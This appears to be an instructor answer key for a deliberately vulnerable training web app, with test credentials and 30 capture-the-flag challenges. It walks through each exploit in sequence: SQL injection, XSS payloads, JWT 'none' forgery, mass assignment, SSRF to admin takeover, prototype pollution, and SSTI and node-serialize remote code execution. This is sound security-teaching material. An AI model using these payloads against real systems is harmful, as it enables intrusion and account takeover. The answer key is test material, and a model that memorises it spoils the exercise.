# Chalanee — Instructor Solutions

> **Confidential.** Do not distribute to students. This file is excluded from the student-facing repository via `.gitignore`.

This document walks each of the 30 vulnerabilities end-to-end.

## Test accounts

| Role | Email | Password |
|---|---|---|
| Admin | `admin@chalanee.com` | `admin123` |
| User | `alice@test.com` | `Password1!` |
| User | `bob@test.com` | `Password1!` |
| User | `charlie@test.com` | `Password1!` |
| User | `dave@test.com` | `Password1!` |
| User | `eve@test.com` | `Password1!` |
| Premium | `premium1@test.com` | `Password1!` |
| Premium | `premium2@test.com` | `Password1!` |

## Trivial Tier

### CH-T01 — Default credentials
`POST /api/auth/login {"email":"admin@chalanee.com","password":"admin123"}` → response `flag_t01`.

### CH-T02 — robots.txt
`GET /robots.txt` → flag in trailing comment.

### CH-T03 — Verbose Server header *(evidence)*
`curl -I http://localhost:3000/` shows `X-Powered-By: Chalanee/1.0.0-beta` and `Server: Express`. Document in report.

### CH-T04 — Missing security headers *(evidence)*
Same `curl -I`; verify absent `Strict-Transport-Security`, `Content-Security-Policy`, `X-Frame-Options`, `X-Content-Type-Options`. Document in report.

### CH-T05 — Directory listing
Browse `http://localhost:3000/backup/` → see `chalanee-2024-12-01.bak`. Open it; flag in trailing comment.

## Easy Tier

### CH-E01 — Reflected XSS
`GET /search?q=<script>alert(1)</script>` — script executes. View source: HTML comment contains the flag.

### CH-E02 — SQL injection in login
`POST /api/auth/login {"email":"admin' OR 1=1--","password":"x"}` — multiple users match the predicate; response includes `flag_e02`.

### CH-E03 — IDOR
Login as alice. `GET /api/users/1` (admin) → response includes `flag_e03` (and `internal_notes` containing the M04 flag).

### CH-E04 — Insecure cookie flags
Login; inspect `Set-Cookie` — no HttpOnly/Secure/SameSite. Login response body has `cookie_advice` field with flag.

### CH-E05 — Sensitive data in JS bundle
`GET /static/js/main.js`; grep for `STRIPE_TEST_KEY`. Flag is embedded inside the fake key.

### CH-E06 — Username enumeration
`POST /api/auth/forgot-password {"email":"admin@chalanee.com"}` → 200 with `flag_e06`. Same body for unknown email returns 404.

### CH-E07 — Weak password policy
Register with password `password` (or `1234`, `admin`, etc.). Response includes `notice` with flag.

## Medium Tier

### CH-M01 — Stored XSS in bio
PATCH alice's bio to `<script src="/api/_canary/stored-xss"></script>` (or any script tag that fetches that endpoint with auth). View profile as Bob — script executes; canary returns `flag_m01`.

Simpler proof: PATCH bio to `<img src=x onerror="fetch('/api/_canary/stored-xss')">`, view as Bob, capture flag from network tab.

### CH-M02 — BFLA
Authenticate as alice. `GET /api/admin/users` → 200 with full user list and `flag_m02`.

### CH-M03 — Mass assignment
`POST /api/auth/register {"email":"hacker@x.com","password":"Password1!","role":"admin","is_admin":true}` → user created with role=admin. Then login → response includes `flag_m03`.

### CH-M04 — Excessive data exposure
`GET /api/users/1` returns full row including `internal_notes`, which is the flag (`FLAG{api-said-too-much}`).

### CH-M05 — JWT none algorithm
1. Login normally; copy the JWT.
2. Decode and edit header to `{"alg":"none","typ":"JWT"}`, payload to `{"sub":1,"email":"admin@chalanee.com","role":"admin"}`.
3. Strip the signature (token ends with `.`).
4. `GET /api/users/me Authorization: Bearer <forged-token>` → response includes `flag_m05`.

### CH-M06 — CORS reflection with credentials
`curl -H "Origin: https://evil.com" http://localhost:3000/api/_canary/cors` → response includes `flag_m06` and ACAO/ACAC headers.

### CH-M07 — Open redirect
`GET /redirect?url=https://evil.com` → 200 HTML with flag in body before meta-refresh.

### CH-M08 — Session fixation
1. Visit any page (browser sets `session=<token>` cookie via login).
2. Login again with same cookie present. Response includes `flag_m08`.

(Easier to hit: `curl -c jar -b "session=fixed-value" -d '{"email":"alice@test.com","password":"Password1!"}' -H 'Content-Type: application/json' http://localhost:3000/api/auth/login` — flag in response.)

## Medium-Hard Tier

### CH-MH01 — Blind SQLi in notes filter
Authenticate as alice. `GET /api/notes?category=foo' AND 1=1--` returns rows; `category=foo' AND 1=2--` returns none. Use boolean blind to extract `_ctf_flags.flag` char-by-char with `SUBSTR`.

Helper sqlmap invocation:
```
sqlmap -u "http://localhost:3000/api/notes?category=foo" --cookie "session=..." -p category --technique=B --tables -D main
```

### CH-MH02 — SVG XSS
Upload SVG with embedded `<script src="/api/_canary/svg-xss"></script>` via `POST /upload/avatar`. Open the uploaded file directly in a browser → script fires; canary returns `flag_mh02`.

### CH-MH03 — Race condition in coupon redemption
Send 5+ simultaneous `POST /api/coupons/redeem {"code":"WELCOME10"}` requests. The 100ms read-write gap lets multiple succeed. Once `redeemers > 1`, the response includes `flag_mh03`.

### CH-MH04 — Negative quantity
`POST /api/orders {"plan":"premium","quantity":-10}` → total_cents = -9990; response includes `flag_mh04`.

### CH-MH05 — SSRF
`POST /api/webhooks {"url":"http://127.0.0.1:3000/api/v1/users"}` → upstream body contains v1 user list, response includes `flag_mh05`.

### CH-MH06 — API v1 without auth
`GET /api/v1/users` (no Authorization header) → returns user list and `flag_mh06`.

## Hard Tier

### CH-H01 — SSTI
`POST /api/users/<self-id>/email-template {"template":"<%= process.env.HARD_TIER_FLAG_H01 %>"}` → rendered output is the flag.

Full RCE alt: `<%= process.mainModule.require('child_process').execSync('id').toString() %>`.

### CH-H02 — Prototype pollution
1. `PATCH /api/users/<self-id>/preferences {"__proto__":{"isAdmin":true}}` (must use raw JSON; the deepMerge walks `__proto__`).
2. Subsequent `GET /api/users/me` includes `flag_h02` because `({}).isAdmin === true` evaluates true after pollution.

### CH-H03 — Chained: SSRF → admin reset → admin takeover
1. `POST /api/webhooks {"url":"http://127.0.0.1:3000/api/internal/admin/reset-password?email=admin@chalanee.com&new=PWNED1!"}` (the SSRF reaches the IP-trusted internal endpoint).
2. `POST /api/auth/login {"email":"admin@chalanee.com","password":"PWNED1!"}` succeeds.
3. As admin: `GET /api/admin/_postowned` returns `flag_h03` (within 5 minutes of reset).

### CH-H04 — Insecure deserialization
Craft a node-serialize IIFE payload that reads `process.env.HARD_TIER_FLAG_H04` and base64-encode:

```js
const s = require('node-serialize');
const p = s.serialize({ rce: function() { return process.env.HARD_TIER_FLAG_H04; }() });
console.log(Buffer.from(p).toString('base64'));
// Note: trailing () after the function literal triggers IIFE during unserialize.
// In practice you replace the inner content with `_$$ND_FUNC$$_function () { ... }()` manually.
```

Submit: `POST /api/sessions/restore {"session_state":"<base64>"}` → `restored` field contains the flag.
